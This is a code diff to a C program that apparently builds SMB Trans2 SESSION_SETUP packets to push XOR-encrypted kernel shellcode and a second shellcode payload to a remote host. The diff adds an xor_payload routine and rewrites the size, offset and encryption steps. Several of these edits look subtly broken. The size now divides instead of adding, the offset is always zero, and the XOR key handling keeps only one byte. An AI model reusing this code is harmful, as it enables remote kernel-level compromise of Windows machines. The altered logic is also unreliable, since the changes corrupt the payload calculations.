@@ -75,6 +75,23 @@ void convert_name(char *out, char *name)
 	}
 }
 
+int xor_payload(unsigned int xor_key, char *buf, int size)
+{
+	int i;
+	char __xor_key[5];
+	i = 0;
+	*&__xor_key[1] = 0;
+	*__xor_key = xor_key;
+	if (size <= 0)
+		return 0;
+	do
+	{
+		*(i + buf) ^= __xor_key[i % 4];
+		++i;
+	} while ( i < size );
+	return 0;
+}
+
 unsigned char recvbuff[2048];
 int main(int argc, char* argv[])
 {
@@ -249,12 +266,12 @@ int main(int argc, char* argv[])
 	"\x90\x90\x90\x90\x90\x90\x90\x90";
 	
 	//might need to make this static due to sizeof being garbage @ counting shellcode
-	unsigned int EntireShellcodeSize = sizeof(kernel_shellcode)+sizeof(shellcode);
+	unsigned int EntireShellcodeSize = sizeof(kernel_shellcode)/sizeof(shellcode[0]);
 	
 	//generate the SESSION_SETUP parameters here
 	unsigned int TotalSizeOfPayload = EntireShellcodeSize ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
-	unsigned int OffsetofChunkinPayload = XorKey;
+	unsigned int OffsetofChunkinPayload = XorKey ^ XorKey;
 
 	//allocate memory for encrypted shellcode payload
 	unsigned char *encrypted;
@@ -270,10 +287,7 @@ int main(int argc, char* argv[])
 	memcpy(encrypted + sizeof(kernel_shellcode),shellcode, sizeof(shellcode));
 
 	//Xor the data buffer with the calculated key
-	for(i=0;i<4096;i++)
-	{
-		encrypted[i] ^= XorKey;
-        }
+	xor_payload(XorKey, encrypted, 4096);
 
 	//build packet buffer with 4178 bytes in length
 	//82 bytes for the Trans2 Session Setup packet header
